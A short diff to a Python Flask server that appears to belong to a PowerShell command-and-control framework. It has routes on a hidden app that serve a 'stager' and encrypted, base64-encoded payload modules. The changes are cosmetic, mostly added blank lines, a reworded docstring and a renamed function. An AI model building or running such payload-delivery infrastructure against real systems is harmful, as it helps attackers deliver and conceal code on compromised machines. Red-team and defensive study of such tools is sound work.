@@ -48,7 +48,7 @@ def rc4byteencrypt(data):
 
 @hidden_app.route('/')
 def stager():
-    """Load 0th stage"""
+    """Load the stager"""
 
     try:
         clipboard_id = int(request.args.get('c'))
@@ -94,31 +94,39 @@ def stager():
 def hub_modules():
     """Return list of hub modules"""
     phst.modules = import_modules()
+
     context = {
         "modules": phst.modules,
     }
+
     result = render_template(
         "powershell/modules.ps1",
         **context,
     ).encode()
+
     result = b64encode(encrypt_aes((result), ph_app.key))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
 @hidden_app.route('/module')
-def payload_m():
+def load_module():
     """Load a single module"""
+
     if 'm' not in request.args:
         return Response('error')
+
     n = int(request.args.get('m'))
+
     if n < len(phst.modules):
         phst.modules[n].activate()
         code = phst.modules[n].code
+
         if 'c' in request.args:
             encrypted = encrypt_aes(compress(code), ph_app.key)
             resp = b64encode(encrypted),
         else:
             resp = b64encode(encrypt_aes(code, ph_app.key)),
+
         return Response(
             resp,
             content_type='text/plain; charset=utf-8'
